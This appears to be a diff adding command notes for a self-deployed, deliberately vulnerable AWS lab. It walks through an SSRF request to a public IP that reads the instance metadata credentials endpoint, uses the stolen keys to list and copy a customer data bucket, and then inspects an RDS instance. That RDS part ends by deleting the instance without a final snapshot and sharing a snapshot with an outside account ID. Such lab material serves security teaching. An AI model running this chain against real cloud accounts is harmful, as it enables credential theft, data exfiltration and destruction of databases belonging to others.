@@ -1,0 +1,54 @@
+Stack creation:
+
+aws cloudformation create-stack --stack-name <your-stack-name>--template-body file://<path/to/your/template> --parameters ParameterKey=<parameter1>,ParameterValue=<value1>ParameterKey=<parameter2>,ParameterValue=<value2>--region <your-region>
+
+
+
+aws cloudformation create-stack --stack-name s3-exposure --template-body file://indirectExposure.yaml --capabilities CAPABILITY_IAM
+aws cloudformation create-stack --stack-name rds-exposure --template-body file://RDSexposure.yaml
+
+
+S3 Exposure commands: 
+
+http://54.173.153.33/fetch
+
+http://54.173.153.33/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+set AWS_ACCESS_KEY_ID=
+set AWS_SECRET_ACCESS_KEY=
+set AWS_SESSION_TOKEN=
+
+
+aws s3 ls --profile ssrf
+
+aws s3 ls s3://customer-data-bucket-085951292823-us-east-1-s3-exposure --profile ssrf
+
+aws s3 cp s3://customer-data-bucket-085951292823-us-east-1-s3-exposure/dummy-data.txt .
+
+
+
+RDS Commands: 
+
+
+mysql -h <your-db-endpoint>-P <your-db-port>-u <your-db-username>-p 
+
+aws rds describe-db-instances --db-instance-identifier <your-db-instance-identifier>
+
+
+Public: 
+aws rds describe-db-instances | grep PubliclyAccessible
+
+
+Encryption:
+aws rds describe-db-instances | grep StorageEncrypted
+
+KMS key:
+aws rds describe-db-instances | grep KMSKeyID
+
+
+aws rds create-db-snapshot --db-instance-identifier<your-db-instance-identifier> --db-snapshot-identifier<your-db-snapshot-identifier> 
+
+aws rds delete-db-instance --db-instance-identifier <your-db-instance-identifier> --skip-final-snapshot 
+
+
+aws rds modify-db-snapshot-attribute --db-snapshot-identifier<your-db-snapshot-identifier> --attribute-namerestore --values-to-add 198766002219
